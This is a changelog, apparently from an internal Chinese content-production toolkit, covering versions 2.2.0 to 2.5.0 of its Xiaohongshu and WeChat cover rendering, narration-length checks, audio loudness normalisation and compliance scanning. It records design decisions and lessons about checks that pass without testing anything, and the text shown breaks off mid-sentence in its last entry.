- 判据是「值内部的 。！？ 个数（末尾那个不算）」，⛔ 不数逗号——逗号在口播里是停顿不是句界，数进来会把正常声明报成跨句。**这条提示不分模式**：分页模式下一页可含多句，但跨条文本在任何模式下都必然找不到。

测试 1739→1743，全量 1743 passed。

---

## [2.5.0] — 2026-08-17

- 🩸 **补 v2.4.0 交付当天就暴露的缺口：oneline 线的稿子两种模式都跑不了**（需求方实测报回）。`--script-file` 要 `## P1` 页标题（连续稿没有）、`--text` 把整篇当一镜必爆 100 字上限。**根因是形态不匹配**：分页形态（轮播/微电影）一页一镜，**oneline 是一整篇连续文本**，分屏是 `build_oneline.py` 事后按 TTS cues 自动断的——**写稿阶段根本没有「页」**。⚠️ 我交付时说「写完稿就能跑」，**没验过那条线的稿件形态**。
- 新增 `--continuous-file`：按 。！？ 切句，**显式关掉 ≤100 汉字硬闸**（`limit=None`），保留十四律软提醒与结构自证（位置判据改按句：hook 在前 2 句、closing 在后 3 句）。
- 🔴 **⛔ 没有用「硬拆成页」糊弄过去**：oneline 若按屏分页每页 ≤12 字，`≤100 汉字/镜` **全过**——闸在，但对这条线**恒绿**，比没有闸更糟（它会让人以为查过了）。⇒ **关掉写成 `limit=None` 而不是把阈值调大**：`None` 读得出「这一项没判」，调大只是让闸门永远不触发。stderr 也明写「本模式不判字数」。
- 🔴 **切句失败会伪装成「一篇短稿」而不是报错**：全篇缺中文句末标点（或用了半角 `.`）时整篇算 1 句，此时三句自证都能在那唯一一句里「找到」、且项数 <5 连位置都不判 ⇒ **全过**。已在入口拦：切出 <3 句直接 exit 2 并指出「多半是断句失败，⛔ 不是稿子真的只有这么几句」。**这是「零命中三态」在切分层的化身。**

测试 1735→1739，全量 1739 passed。

---

## [2.4.0] — 2026-08-17

- **§八 结构骨架三段落成闸门**：`check_narration.py --intent-file`（选填）。写完稿回头把 `hook`/`scene`/`closing` 三句**成稿里的逐字原句**粘进 json，脚本查它们在不在稿里、hook 是否在前 2 项、closing 是否在后 3 项。**项数 <5 不判位置**（前 2 与后 3 会重叠，判了就是恒真/恒假的假闸门）。
- 🔴 **为什么是「粘原句」而不是「答一句话」**（这条比功能本身重要）：2026-08-17 实证——**规格里「能拿来跑通一件事」的部分（参数、命令、阈值）会被执行者精准读取；「指导判断」的部分（十条、结构骨架）不会，因为它不阻塞任何一步、不读也能交差**。同日某线写三稿，`narration-spec` 上墙十条**一次没读**，却把「12 字」实现成了量字脚本——**因为 12 字是个可执行的数**。⇒ 让判断类规范获得同样质地的唯一办法是**让答案可被机器比对**：⛔「钩子是开头那个反直觉的说法」＝描述，随手写一句就过；⭕ 粘原句＝脚本能查。**副作用是好的：粘原句会逼人写完后真的回去找那一句，找不到＝他没写。**
- **两种失败必须分开报**：严格比对没中时再做一次去标点的宽松比对——「**P01 里有这句但字面对不上**」与「**这句不在稿里**」是两回事。合并成一句的话，写手会以为漏写而**转头去补一句，那就写重了**。⇒ **报错的精度直接决定人会不会走错路。**
- ⚠️ **射程写进文档：只验「有没有」，⛔ 验不了「好不好」**——同日某 81 屏稿三样俱全、逐条能过，仍因**句子被切碎**不合格。**⛔ 别因为它没治好「读起来不通顺」就去加第四问第五问，那就变填表了。**
- **不传 `--intent-file` 时输出里没有 `intent` 键**、stderr 明写「未做结构自证」——⛔ 别读成「自证通过」（同 `hero_fill_min` 竖版恒 `null` 而非 `False` 的口径）。
- 🩸 **测试文件尾部追加辅助函数前先 grep 同名**：新加的 `_run` 静默覆盖了上面已有的 `_run(args)`，打断 5 个老用例。**这次报了 TypeError 是运气——签名若恰好兼容，它们会静默用错实现跑、照样报绿。**

测试 1727→1735，全量 1735 passed。

---

## [2.3.0] — 2026-08-17

- **字卡新增背景档 `miwen`（浅米白·强纹理），新片首选**：老板 G10 亲批的候选 B。七字段是运营线交出来的**原值**，注释里钉死「⛔ 别凭观感重调——老板批的是那一张图，重调出来的是另一张」，尤其 `seed=17`（换个 seed 就是另一张纹理）。两旧档 `liaoyu`/`kepu` 真实数据渲图逐字节零变化。
- 🔴 **校准图口径陷阱（拿它比像素会得出「没搬对」的错结论）**：`B-浅米白-强纹理.png` 出自**候选预览页**，预览页的纹理层**少一句 `mix-blend-mode:multiply`**，所以它比真模板出片**更浅更淡**（无文字带 `[212.82,207.93,199.48]`/R−B 13.35 vs 真模板 `[208.00,201.08,188.80]`/R−B 19.20）。把模板的 multiply 去掉可**逐项复现到小数点后两位** ⇒ 这是**合成口径差，不是参数搬错**。⇒ **验参数比 `BG['miwen']` 七字段，⛔ 别拿预览图像素当靶子。**⚠️ 连带一个待老板拍的事实：**他批的那张图比真出片更浅**。
- **落款反差立为「加背景档必量的一项」**：`brand` 是半透明色压在纹理底上，**换了底色实际反差就变了——沿用别档的值 ≠ 沿用了它的可读性**。量法写进 spec（强制 `opacity=1`、藏 `#stage`、Otsu 分簇取亮度差）。三档实测 `liaoyu` 53.1 / `kepu` 60.3 / **`miwen` 56.0**，沿用值够用不动；WCAG 均远低于 4.5:1 是**有意为之**（落款是装饰水印非正文，拉到正文标准会抢走中间那行字的视线）。
- ⛔ **没给 `--bg` 加 argparse default**（唯一没照"设为默认"字面执行的地方，是对的）：既有红线「绝不给 `--bg`/`--canvas` 编默认值悄悄出片」防的正是"谁忘了传参、片子照出、背景没人确认过"。**「默认」只落在文档示例＋spec 首选标注上。**
- 🔴 **留痕：本仓改完≠新片会变**。`--bg` 的实际来源是每个运营的风格档案 `video.oneline.bg`（`video_style.py:54`），那是 **nbdpsy-server 的数据、不在本仓**。**档案里不改成 `miwen`，新片仍出旧背景**——文档改了也没用。⇒ **加/换默认档时必须同时问：真正决定它的开关在谁手里。**

测试 1724→1727，全量 1727 passed。

---

## [2.2.1] — 2026-08-17

- 🔴 **补回被删掉的守边界测试**：`test_竖版上限告警一个字没动` 是为「竖版逐字节零变化」立的，**它是 `solveHeroMax()` 落地时唯一拦住我的东西**（报 `assert 0 == 1` 才让人发现竖版被动了）；重写测试段时被整个删掉、当事人自己没意识到。已恢复为**三条继任者**（钉新事实 / ⛔ 别让「不再报」变成「再也报不了」/ 把影响面判据变成可执行断言）。**自查句：改测试时先问「我删掉的这条，是不是唯一会拦住我的那条」。**
- **影响面判据订正**：⛔ 不是「≤4 字」，是**「旧解 > 新上限」**——只有字号原本被**上限**接管的会变，被**宽度**接管的一律不变。⚠️ **1080×1440 上 5 字是边界**，落在哪边取决于字形墨迹比（纯中文不变、标点混排会变）。交付五张实测 **5/5 逐字节一致**（两人独立复量）。
  🔴 顺带一个取证事故：第一次跑得到「5/5 全变了」，真因是**那五张的 `1080×1440` 来自命令行 `--canvas`、不在 JSON 里**，复现时没带这个参数。⇒ **复现别人的产物时，命令行参数也是数据的一部分**，得从凭证的 `input.argv` 读，⛔ 不能只喂 `--data`。
- **竖版占宽：量具留下、闸门放下一轮**（理由不是"来不及"）：实测**同样 3 字，876×1313 占 71.0%、1080×1440 占 61.9%，差 9 个百分点**——竖版 `pad-x` 是固定 60px 不随画布缩放，而横版按 `0.065W` 比例缩放，所以横版四档画布才同值。⇒ **一个固定百分比在竖版自己内部就不通用**，阈值必须由画幅推导。`hero_fill_pct` 改为交回实测值（只量不判）；`hero_fill_min` 在竖版**恒 `null` ⛔ 不是 `False`**——**`False` 会被读成「判过了没问题」，`null` 才读得出「没有闸门」**。
- 清掉 `hero_glyph_band_canvas` 死注释，留痕：**删模板字段必须同步删 `FIT_KEYS`**（否则每张都渲不出来、报「模板与脚本版本对不上」）。

测试 142→150，15 条逐条证伪全红；全量 1724 passed。

---

## [2.2.0] — 2026-08-17

**小红书封面工序反转成「文案先行、规格后置」**（老板 15:55 定案，原话：「**规格实测，不要先给那么细的规格再写作，最好是反过来，先写封面内容，然后再让一个 agent 进行排版设计，可以一定程度上的改文案，但需要表达清晰**」）。

- **工序③ 拆成三段，⛔ 顺序不许倒**：**文案步**（写封面文案，只给内容判据）→ **排版步**（持全部量具、有限改文案权）→ **验收步**（渲染验收与凭证）。⚠️ 三段刻意**只用中文名、不带 ③- 前缀也不用字母**——本文档里本来就有过「③-b 内页出图」这种写法，字母段号与小节号撞脸是迟早的事。
  🔴 **这是「规格从写作阶段撤到排版阶段」，不是删规格**——hero ≤6 字 / 字高 9–13% / hero:副题 ≥2.5:1 / 四级字阶系数 / 折行上限**一个都没删**，全部变成 排版步 的**内部量具**，⛔ 不再前置约束写作。
  **病根**：把这些数扔给写文案的人，他先算字数再想说什么，交回来的是"排得下的短标题"而不是"打得动人的金句"。
- 🔴 **文案步必须派独立子代理执行**（老板原话「先写封面内容，然后**再让一个 agent** 进行排版设计」——「再让一个 agent」＝要的就是两个 agent）：给它的指令 ⛔ 不含任何字数/字高/比例数字、⛔ 不让它读 §2-c，它的交付 ＝ 金句 + 结果层 + 加码层 + 四条判据自评、**⛔ 不含版式意见**。
  **为什么非拆人**：两步落在同一个 agent 身上时，它脑子里装着全部量具、不可能真的「不知道 hero ≤6 字」，倒置就退化成走过场。⚠️ **这一条同样没有代码能拦**——它做到的只是把「偷看规格」从「默认会发生」变成「要主动违规」，⛔ 别当闸门。
- **文案步 的验收标准 ＝ 老板那句话的四个分句，落成可打勾条目**：**把话说完整 / 能让人理解是啥 / 有金句 / 让人一看就感觉说的是自己**。原有内容判据一条未撤（hero 四判据、副题回答「然后呢」、事实边界、读者三段式、条件头像触发、合规）；⚠️ 文案步还没有 hero（hero 是 排版步 从金句里截的片段），**此时四判据判的是那句金句**，验收步 对着缩略图再复判一遍。
  **「金句 10–30 字」明确为长度感、⛔ 不是新配额**（老板另一条在案原话「封面不一定需要多好看，但一定要金句才能提高 CTR」）。
- **排版步 的改文案权有明确边界**：⭕ 断句/换行点/**从金句截片段当 hero**/拆句（原句落副题）/删虚词/同义短词/标点/层间挪内容/hero ≤4 字时从原句补字；⛔ 论点本身、事实与数字（**含限定词**）、金句最扎心那半句、术语准确性、合规文字、读者主语、新造原句没有的词、删掉整整一层。
  **两句自查**：① **并排读测试**——改前改后并排读给不知情的人，**会不会得出不同结论**（会＝越界）；② **事实成分逐字回溯**——改后每个事实成分都能在改前逐字找到（找不到＝新增事实）。⚠️ 第②条专抓最隐蔽的一类：**删限定词**（「**部分**来访者六周后改善」→「六周后改善」＝事实被放大成承诺）。
  **改完两件事**：把定稿**回写 `post-NN.md` 的 P1 封面块**并重跑 `check_compliance.py`；在 `00-overview.md` 的**「封面改文案留痕」**块补行（原句｜改后｜为什么）并回读作者一次。
- **红灯循环写死**：`render_cover.py` 报红是 排版步 自己的活——**①换版式 → ②行使改文案权 → ③才准打回 文案步**。
  **一句话判据：「删到伤意思」才回 文案步，「排不下」不回。** 两个打回口性质不同：**A·装不下**（必须带"试过哪几个版式、改过哪几处、卡在哪条量具上的多少"）／**B·内容不过**（⛔ 排版步 不许自己改内容去救）。⛔ 打回时不许把量具当需求提过去（「请写一个 6 字以内的 hero」是错误提法）。
  **字高/折行/溢出/比例这类题从此归 排版步 自解、不再上报**（实证：C 篇 hero 4 字字高 13.79% 超上限，此前被当成一道要人拍板的题）。
- **配套的次序与口径同步**（防「一处改了另一处说反话」）：
  - **真实时序改为 `② 文案 → 文案步 封面文案 → ④-a 稿件审 → 排版步 → 验收步 → ③-2 内页出图`**——文案步 排在稿件审之前，是为了让封面文案落进 `check_compliance.py` 与 `gates.seller_view` 的扫描面（**这是整套新工序唯一挂得上已有代码闸门的位置**）；
  - **§2-b「拳头短语是写稿阶段的交付物」作废**，改为「**排版步的产出物**」（物理约束 ≤8 字继续成立，变的是谁来满足它），旧口径就地留痕；
  - **§2-b 超容次序调整**：`①删冗压缩文案` 从第一位下调，新次序 **①换版式 ②换行/留白 ③让位 ④改文案 ⑤拆到内页**——先动排版、后动文字才是排版师的本分；
  - 层级三层制、排印参数、版式库「适用」列、§2-a 封面字数档、出图工作流硬闸，逐处标清属 文案步（内容）还是 排版步（量具）；
  - 返工回流表新增「**排版步改了封面文案**」一行；旧称 **③-b 内页出图**停用，一律写 **③-2**（小节只用数字、工序段只用中文名，两套符号不重叠）。
- **黄金范例 `assets/example-xhs-note.md` 的 P1 封面块按新工序重写**：拆成「**封面文案（文案步产出）**＝金句／结果层／加码层 + 四条自评」与「**版式・页面文字・提示词（排版步填）**」两段，并示范了**从金句截片段当 hero、副题放完整原话**、以及一条真实的**改文案留痕行**（删虚词「其实」，理由指向"副题折行逼近上界"）。**这一处是旧模式最容易被复制下去的地方**——SKILL.md 明令"格式照黄金范例抄"。
- **审查端 `nbdpsy-content-reviewer/references/checklist-note.md` 补两条判据**（判据 2 封面组内）：**留痕判据**（改过文案必须有「封面改文案留痕」块，**且每行的「为什么」要指向一条具体量具**——写"优化表达""更顺口"这类**无信息理由 = FAIL**）、**一致性判据**（`post-NN.md` 的 P1 页面文字 ≡ `cover.json` 的 hero+subtitle+steps，逐字比；不一致的根因几乎总是"只改 JSON 没回写 post"，后果是合规扫的是旧字）。
  🔴 **为什么落在审查端**：这两件事**创作端没有任何代码拦得住**；且留痕表**最先烂的地方就是理由那一列**，所以判据直接落在那一列。⛔ 截片段当 hero / 为断句调标点**不触发**留痕要求（老板明确"不算改文案"）。
- 🔴 **P1 的论点行 ＝ 文案步的金句，同一句话的两个名字**（合流，⛔ 不设例外条款）：`gen_images.py` 的 R4 结构闸门要「这张图要让读者带走的那句话」，文案步判据甲要「自己就是一段完整的话」——**要的是同一个东西，金句只是更强形态**（多了张力与可转发）。⚠️ **反过来不成立**（内容页论点行不必是金句）；⚠️ **排版步改了金句，论点行必须跟着回写**（`gates.seller_view` 扫论点行 + P1 页面文字两处）。
  📌 **旧写法「封面的论点行＝hero」作废**——hero 现在是排版步截的片段，比论点行短、常常不成句。
  📌 **附带好处**：金句进论点行 ＝ 金句进 `gates.seller_view` 扫描面，判据丁「说的是自己」从此有一半是机器在扫。
  ⚠️ **这条是被测试逼出来的**：黄金范例兼作 `tests/test_gen_images.py` 的夹具，P1 重写后 R4 闸门当场判「缺论点行」、三条测试转红——**范例一示范违规写法，测试立刻红**，这是好设计不是麻烦。⛔ 未改测试去迁就范例。
- **文案步的交付必须附「我收到的指令原文」**（贴进 `00-overview.md` 的「封面文案步派单留痕」）：拆两个 agent 防的是「写文案时脑子里装着量具」，但**派单的人就是那个装着量具的 agent**，可以在 prompt 里顺手写「hero 控制在 6 字内」。贴出来，审查端才能核。⚠️ **只能拦住老实交出 prompt 的人**，⛔ 不是硬闸门。审查端配套加**派单判据**（prompt 里出现字数/字高数字 = FAIL）。
- 🔴 **新增 §2-0「先判这张图内该不该有字」**（2026-08-17，两次翻车逼出来：①小红书 hero/subtitle 被平移到公众号封面，违反那边「画面中不出现任何文字」＝两份标题打架；②拿图内零文字的静物版式做视频封面，老板打回「我要的是封面，不是几个元素的凑数」）：
  🔴 **判据写成「前提嵌在规格句里」的形状，⛔ 不写成"哪个平台配哪种做法"的并列清单**：
  > **当这张图旁边、有别处替它把标题说了——图内零文字。**（「替它把标题说了」＝那行字大到读者第一眼读的是它、不是图上的字）

  **为什么是这个形状**：并列写法要求读者**先认出自己在哪个场景，认错就套错**；前提嵌在句子里，**规格自带适用条件**——换到没写过的载体时读者会发现**前提不成立、规格自己失效**，而不是被悄悄误导。
  另有第二问兜「承载信息的字」（同屏有没有正文），否则推不出「公众号正文插图仅 ≤6 字点位标注」那一档。四种在产载体落点表：公众号封面⛔零文字（前提成立）／公众号正文插图仅点位标注／小红书图文封面🔴三层齐（前提不成立）／视频封面🔴大字＋金句（前提不成立且最彻底）。**第五种载体按两问自推，并把结论连理由补回表里。**
  ⚠️ **就地留痕一处最容易判反**：**小红书信息流是显示笔记标题的**（「底部 10-15% 禁字」那条的理由就写着"被笔记标题/昵称遮挡"）——⛔ 不能说"小红书没有标题位"，有，只是**那行字没替封面把标题说了**（字小、次要、限 20 字，读者第一眼读的仍是封面大字）。**判据问的是"有没有替它说了"，不是"有没有显示"**；只问"有没有显示"会把小红书判成公众号那一档，**这正是第一次翻车的形状**。
  **与服务号规格互指**：两份在这一条上**相反**，**两边都对是因为载体不同、不是谁的规格旧**；⛔ 别拿另一份当理由改本文档。（只在本仓这份里写指向 `gzh-illustration-spec.md` 的话，⛔ 未改服务号线的文件。）
  **挂在必经路径**：排版步动手前先判；交接视频那一段也点明"视频封面必须有大字＋金句"。
- 🔴 **§2-0 附「写规格时把前提一起写出来」通用提醒**（今天同一形状出现三次：阈值是在某个画幅下标定的／这条规格是在有外部标题的前提下成立的／合规扫描域是被"工具收哪些文件"这个形态决定的）：
  > **前提在当下场景恒真，正是它最容易被省略的原因，也正是它换场景后最容易悄悄变假的原因。**
  **自查句：这条规格，在什么情况下会不成立？答不上来 = 前提还没被写出来。**
  ⚠️ 视频封面那次翻车**推理没错，错在没意识到"旁边有标题"这个前提已经变假**——**同一条规格，前提变了，结论就反了**。
- 🔴 **如实登记「拦得住 / 拦不住」**（SKILL.md 工序③ 开头有完整表）：合规、卖方视角、排版达标、有没有封面凭证——**这四类结果有代码拦**；**「有没有先写文案再排版」与「改了文案有没有留痕」没有任何代码拦得住**，只能靠自觉 + ④ 对抗审查端。⛔ 别把"写着"当成"拦得住"。要补闸需改脚本（`--check-cover` 增查留痕块、`render_cover.py` 增校 `cover.json` 与 P1 块逐字一致），**尚未实施**。

**同批其它线交付**（2026-08-17 下午～晚间，各线并行）：

- **合规检查抽成收「文本片段」的共享模块**（`shared/compliance_core.py`）：根因不是「没抽出来」，是**扫描域被工具的输入形态决定**——公众号 `digest`（摘要）**从来没进过任何合规扫描，且按原架构永远不会进**，因为所有扫描器都读**文件**，而摘要是建草稿时单独传的参数、只活在 batch.json 与命令行里；它却是**读者在信息流里第一眼看到的那行字**，同族还有 title/author/content_source_url。**没有人做过「摘要不用扫」这个决定**，它是工具形态的副产品；⚠️ 最阴的一点是 **md 扫干净了所有人都会以为扫完了**，缺口被一份真实的绿色报告盖住。判据写进模块 docstring：**判断扫描面够不够，问的是「读者能看到哪些字」，不是「我手上有哪些文件」**。`check(units, *, crisis_scope)` 入参是 `[(定位标签, 文本)]` **⛔ 不是文件路径**（只要它收路径，扫描域就被文件边界锁死），测试用 `inspect.getsource` 断言模块里不出现 `open(`/`read_text`，把这条钉成不变量。`crisis_scope` 只有 `joined|skip` 两个取值、非法值抛错 ⛔ 不静默回落；⚠️ `skip` 只豁免「声明在位」，**绝不豁免停用热线**（可以不带危机声明，不能带错号码）。词表两处重叠都从 core 派生：`check_compliance.JIXIAN` 改为 core 词＋小红书平台专属扩充（⚠️ 行为变严一处：`保证有效` 此前小红书侧漏检、现纳入）、`preflight` R7 修复建议改为从 `ABSOLUTE_WORDS` 现拼（**手写的帮助文案不会跟着词表更新，漂的是人不是代码**）。vendored 到 8 个 skill＋`tools/sync_shared.py` 同步＋逐字节比对测试（vendored 本身就是当天咬过两次的漂移形状，配机检不配记性）；全量 1602 passed（+16，第一条就是缺口本身）
- **停用热线闸门放行「更正声明」**：老板定的是「已发布的不删不重发，在下一条推送里更正」，而更正段**必须写出那个停用号码**——不写读者不知道更正的是哪条热线；两侧闸门原本只认字符串 `4001619995`、不认它在句子里扮演什么角色，会把更正稿一起拦掉。🔴 **真正的危险不是被拦，是接下来那一步**：有人照着闸门去「修」，把更正段里的号码删掉，于是更正废了、闸门反而变绿——**闸门亲手制造了它本该防的那个后果**。判据两侧同口径且**必须同行**：①同行有停用声明词（已停止服务/已停用/更正/勘误…）②同行无推荐动词（拨打/致电…，排除「已停止服务，请拨打 4001619995」这种自相矛盾写法）；⛔ 声明词不取全文任意位置，否则文末一句「已停用」会豁免全篇的号码。`check_compliance.is_retirement_citation` ↔ `preflight` R8 各补三条对称测试，报错文案明写「把声明词写进同一行即可放行，⛔ 别为了过闸门把号码删掉」
- **音频母带响度收编成唯一实现，四个出口全部调它**（`nbdpsy-text-to-video/scripts/audio_master.py`）：老板 2026-08-16 实听投诉「背景音太小」后，归一只做在轮播一条形态上；体检发现缺归一的有三条，其中 `compose_video.py` 正是 SKILL.md 写明的**默认主线形态「笔记微电影」**——⚠️ 先前「compose_video 与字卡共用」的判断是错的，字卡走自己的 `render_card.py::mux()`，漏的比原先报的还多一条。⛔ 不在四处各抄一份，这次事故的根因就是「一处修了另几处没修」。四条各跑真合成（造 −27.95 LUFS 安静素材复现事故起点），成品用 loudnorm 与 ebur128 两把独立量具各量一遍：**轮播 −16.02／微电影 −16.03／字卡 −16.06／播客 −15.99 LUFS**（判据 −16±1）；轮播线行为零变化有硬证据——**改动前后成片音轨解码成 PCM 后 md5 完全相同**，老板唯一实听验证过的那份逐样本没动。BGM 相对压低一并搬进共享实现，测量域从 RMS 改为 LUFS（同一条片子两者结论方向相反：RMS 说「才低 7dB 压得不够」，LUFS 说「低 18LU 基本听不见」）。播客要不要另设响度档：查完结论**不该分**（Apple 官方播客指标本身就是 −16±1，「−16 是短视频专属」这个前提不成立），分档位置留在 `FORM_TARGETS`
- **口播长度从「纸面强制」变成有验证闭环**（`check_narration.py`）：narration-spec §九 定了「≤100 汉字/页」，但**全仓没有任何脚本读它**，SKILL.md 写着「必须走完审校流程」却没有任何东西能抓出漏做。⚠️ §九 原文称「脚本层管不了长度」，该论证有漏洞——管不了的是秒数（语速页间浮动 20%），字数 `len()` 就能判，已加更正留痕。挂三处必经路径（`render_storyboard` 第 2.5 步为主闸，卡在精修与 TTS 之间；`slideshow --script-file`；`build_manifest` 兜底），拦住时不出确认页、不写 manifest、不调 TTS。**硬闸只有一条**（汉字数 >100，按 `[一-龥]` 数，标点英文不计入）；书面连接词、破折号、引语一律 warn ⛔ 不拦——它们有合理例外，硬拦会变成恒红闸门没人理。19 条证伪测试含「『该』作动词的六种合法用法必须放行」，并当场抓出一个真 bug：`"" in "..."` 恒 True 导致句首「该机构」被静默放行（**只测违规样本是抓不到的**）
- **口播闸门自己有个恒绿洞——字段名一漂就静默全放行**：拿本轮判据「『没找到』必须与『没去找』可区分」回头试刚建的闸门，实测**两镜各 300 汉字、字段名写成 `narration`（不是 `narration_text`）→ ok=True、超标镜数 0、总汉字 0，全部放行且一声不吭**。改成三态：超标／确认没超标／**观测失败（blind）**，第三态非零退出并打 🚨，附「先核字段名；确属无口播的片子显式加 `--allow-empty`」——⛔ 给合法情形留明写的门，不做成没法通过的死闸。⚠️ 第一版修法判据又用错了：拿「汉字数是否为 0」当「有没有读到」，被既有夹具 `narration_text: "n1"`（**有内容但零汉字**）抓成误报——正确判据是「原串是否为空」。**为了区分「零」和「缺失」而加的守卫，第一版自己就把「非中文内容」错判成了「缺失」——混同的方式不止一种。** 元收获：这条判据的真正用法不是「检查我的检查脚本」，是「检查我交付的产品」——**核查脚本坏了只是这次白核一遍，闸门坏了是往后每一次都白拦**
- **风格档案第三形态 `kind=video`**：四个子形态 slideshow/card/microfilm/podcast 放在档案内容的 `video.form`，**⛔ 不塞进 `kind`**（否则 kind 变复合值，所有按 `kind=="video"` 判的地方全断）；服务端 kind 无枚举校验（模型注释明写「原样存不理解含义」），故为纯客户端改动。🔴 **每个字段必须指得到一个真正读它的地方，并做成了测试**（`test_每个骨架字段都指得到一个消费者`）——老板「不要死链，永远闲置不被调用」第一次被代码钉住而非靠人记得；为此主动砍掉四个查完指不到消费者的字段（bgm.mood 放映线没透传／master_lufs／fps／微电影 bgm.duck_db）。`--last`「按上次」记忆存 `~/.config/nbdpsy/last-choice.json`（老板拍板本地文件，知情接受换机器不跟人走），**裸 `--get` 一字不变**、必须显式 `--last` 才生效——四处消费方都按裸 `--get` 读，让一个别人看不见的本地文件改它，等于同一条命令在两台机器上出两种档案；三种降级（无文件/文件坏/记的套已删）各有测试。本批新增 127 条测试
- **HTML 封面产线扩到公众号 + 补上 `render_cover` 的第一组测试**：老板「出图尽量用 HTML」＋OpenAI 额度耗尽无法充值 → 公众号封面从 gpt-image-2 改走确定性渲染。新模板 `tpl-gzh-stilllife.html` **没有文字槽位**——不是「可选参数」：公众号标题由微信自己渲染压在封面旁，图里再写就是两份标题打架。几何常数从服务号线一张手工封面反解，按**墨迹高**（含描边）而非 svg 盒子定尺寸阶梯（同一 24 网格里墨迹占比差很多：headphones 18/24 vs plant-stake 14/24，按盒子排版式会崩）；像素比对三件静物 Δ宽/Δ高 全 0、均色差 ≤0.3。`render_cover` 扩展：`--template` 收别名或路径、`--canvas` 收 `1313x559` 或 `2.35:1`、`--out` 按扩展名出 jpg/png、图标必须来自 `svg-library`（不在库 exit 2 并列出可选名，⛔ 不静默跳过）、退出码三态 0/1/2；凭证叫 `<产物名>.meta.json` **⛔ 不叫 `.json`**——后者已被调用方 `gen_gzh_images.py` 占作输入数据，照契约字面写会覆盖它。🔴 补 `tests/test_render_cover.py`（25 条）堵一个结构性缺口：**此前全仓没有一个测试引用 `render_cover`**，所以一次 `make_thumb()` 缺参的 TypeError 能穿过 1408 条全绿的 pytest；核心是 ast 调用处签名漂移检查，拿那次真事故反证过（改回漏参版能精确报出行号）。两个假闸门的对策也在里面：`document.fonts.check()` 对任何字体名恒 true → 改用 CDP `CSS.getPlatformFontsForNode`；零文字判据扫文本节点/SVG text/伪元素三类并证伪过
- **横版视频封面版式：豁免第④层并真的把它收起**（老板 16:36 打回两条视频封面「我要的是封面，不是几个元素的凑数……需要封面、标题、金句啊！」——打回的正是图内零文字的静物版式，而**视频封面旁边没有任何地方显示标题，图上不写字就真的只剩几个元素**，判据见 §2-0）。改法不是新做一套版式，而是让既有大字版式在横版画布下成立：**横版（w>h）豁免 avatar/identity 判据**——四层版式（hero/递进/头像/落款）本来就是为竖版定义的，横版下第④层不存在、不是「缺了」；⛔ 不静默豁免，stdout 与凭证都出 `exempted` ＋一句理由，**空列表也照常出字段**，免得竖版的「一条没豁免」变成看不见的默认值；⚠️ 体检必须排在画布定下来**之后**（`--canvas 16:9` 时数据里根本没有 canvas 字段，排在前面会判反，已加测试锁死）。**横版下第④层整层收起**：既然豁免的说辞是「这一层压根不存在」，它就得真的不存在——只豁免闸门却照旧渲染，得到的是姓名悬在左下、还与底部落款重复的半拉子头像层，**那正是老板说的「凑数元素」本身**；代价是横版下传 identity 会被吃掉，故 `landscape_layer4_hidden` 从 DOM 量出来单独报，与 `exempted` 分开（一个说「闸门放了行」，一个说「版面真收了」）。内容组垂直居中实测 content_center_pct 24.4%→45.0%。🔴 **竖版逐字节零变化**：8 份在产 JSON ×（成图+缩略图）共 16 个文件 md5 全等，基线取自 `git show HEAD:` 的脚本+模板搭影子目录渲染；⚠️ 先验过渲染器**确定性**（同脚本连渲两次 md5 相同）否则 md5 这个量具本身不成立。⚠️ 顺带记一个新的假绿形状：前一轮留下的工作树是**崩的**（`check_fields` 改成返回二元组、调用处仍 `tuple + list` 直接 TypeError，**每一张竖版封面都渲不出来**），而 `pytest tests/test_render_cover.py` 当时 58 passed 全绿，**AST 调用处签名漂移闸门也没抓到——实参个数没变、变的是返回形状，静态 arity 检查照不到**；补了一条端到端（`--html-only` 子进程真跑 `main()`，不需浏览器）当克星。测试 +15 条含竖版负例与横版负例（⛔ 不豁免 footer、⛔ 不豁免 hero 行数上限——**豁免是白名单不是全放行**）；全量 1617 passed
- **公众号配图加 `--provider html` 分支；正文插图比例按实测改 3:2**（服务号线实现、本线发版）：`--provider html` 走 `render_cover.py` 确定性渲染、零出图额度。**双向守卫**：html provider 收到自然语言围栏、openai provider 收到结构化 JSON（含 template 或 layout 键）都明确报错指路——⛔ 不做模糊推断，只在「整段是合法 JSON 对象」时才拦，不因提示词里夹了花括号就误伤；反向那次的失败模式是「**JSON 被当提示词发给生图模型，出来必是废图、白烧额度、回执却一切正常**」。规格订正：正文插图从「16:9」改写为「请求参数 `aspect_ratio:"16:9"`，到手画布 3:2」，**两个数都留**——16:9 只是出图 API 的参数名，标称 1536×1024 本身就是 3:2，去水印等比缩小后 1313×876＝1.4989，在产 31 张零例外；⛔ 不要为了对齐文档把参数改成 3:2（会改变服务端行为）。同批把 `gen_gzh_images.py` 的口径收尾成三者一致（openai 路径喊 16:9 是外部契约／html 路径喊 3:2 是真名／闸门按 3:2 判），并清掉改动产生的死键 `CANVAS_ILLUS`
- **`check_images` 加横版画布口径，白名单按实测不按文档写**：公众号横版图此前一律被判红（只认竖版 2:3/3:4）。新增 `--canvas landscape`，`--pages` 改为可选（公众号是 cover.jpg / illus-01.jpg，没有 P 页号可数）。🔴 **白名单里横版插图写的是 3:2 不是 16:9**——照文档建白名单会让每一张都判红，是**假红**；测试同时锁「3:2 放行」与「真 16:9（1920×1080）不放行」，防日后照文档「修正」回去。两套白名单**⛔ 不合并成一张大表**：合并后横图混进竖版轮播也会放行，而那正是这个检查最该抓的错（`test_landscape_image_still_fails_portrait` 锁住）。JSON 加 `canvas` 与全量 `sizes`（含命中的比例名）——忘裁封面这类错光看 ok 看不出，看 cover 那行标的是 3:2 还是 2.35:1 一眼就见
- **SVG 素材库扩到六个开源集合 ＋ `svg-find` 本地检索**（老板 16:15：「html 出图尽可能用公开免费的 svg，多搜集一些，或者使用的时候直接现搜索」）：先补 headphones/coffee/cup-soda 进平铺库 63→66（服务号线那张实证封面按本地文件名写 icons 必失败，且失败长得像路径拼错、很难往「素材缺失」上想）；再入 lucide/tabler/iconoir/heroicons/ph/mdi 六个 Iconify 集合，**独立图标 27,837 枚、连别名计 34,995 条**、12 MB，只拷 `icons.json`+`info.json` ⛔ node_modules 不进仓。台账**按集合记 ⛔ 不按图标记**（三万多行没人看），但 🔴 **可靠性依据不能建在 `info.json` 上——它会过期**：实测 `ri` 的 info.json 仍写 Apache-2.0（上游 2026-01 已换自订许可证）、`mdi` 写 Apache-2.0（实为 Pictogrammers Free License），故每个集合**下载上游 LICENSE 原文入库**、台账与 svg-find 都以原文为准、info.json 只当索引并有测试钉着——**机器可读 ≠ 机器正确**。⛔ **Remix Icon 不入库**：其 §3.2 禁止「create, distribute a competing icon library or 